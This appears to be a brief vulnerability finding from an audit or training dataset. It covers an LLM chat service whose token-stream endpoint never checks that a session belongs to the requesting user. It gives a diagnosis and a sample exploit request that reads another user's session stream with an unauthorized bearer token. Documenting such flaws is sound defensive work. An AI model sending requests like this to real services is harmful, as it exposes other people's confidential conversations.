diagnosis: The endpoint streams live LLM generated tokens and assistant responses for session_id via EventSourceResponse without ensuring that session_id was initiated by current_user.id. Any authenticated user can listen in on concurrent proprietary prompt completions and confidential conversations of other users.
exploit_request:
GET /api/v1/llm/sessions/chat_sess_994812_legal/token-stream HTTP/1.1
Host: api.example.com
Authorization: Bearer <unauthorized_jwt>
Accept: text/event-stream
